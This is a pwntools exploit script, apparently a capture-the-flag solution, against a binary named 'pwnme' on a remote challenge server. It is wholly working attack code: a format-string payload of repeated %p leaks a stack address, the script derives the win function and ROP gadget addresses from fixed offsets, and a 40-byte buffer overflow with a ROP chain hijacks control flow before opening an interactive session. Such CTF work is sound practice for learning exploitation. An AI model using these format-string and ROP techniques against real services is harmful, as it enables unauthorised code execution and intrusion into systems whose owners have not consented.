from pwn import *
from pwnlib import *

#p = process("./pwnme")
#p = gdb.debug("./pwnme")
p = remote("0.cloud.chals.io", 20646)

payload1 = b'%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p'
#gdb.attach(p)
p.sendline(payload1)

addr_main = p.recvuntil(b'282').split()[-1]
addr_main = int(addr_main[2:],16)

addr_win = addr_main-84

pop_rdi = addr_main+209
ret = addr_main-616

payload2 = b'A'*40
payload2 += p64(pop_rdi)
payload2 += p64(0xdeadbeef)
payload2 += p64(ret)
payload2 += p64(addr_win)
#gdb.attach(p)
p.sendline(payload2)
p.interactive()
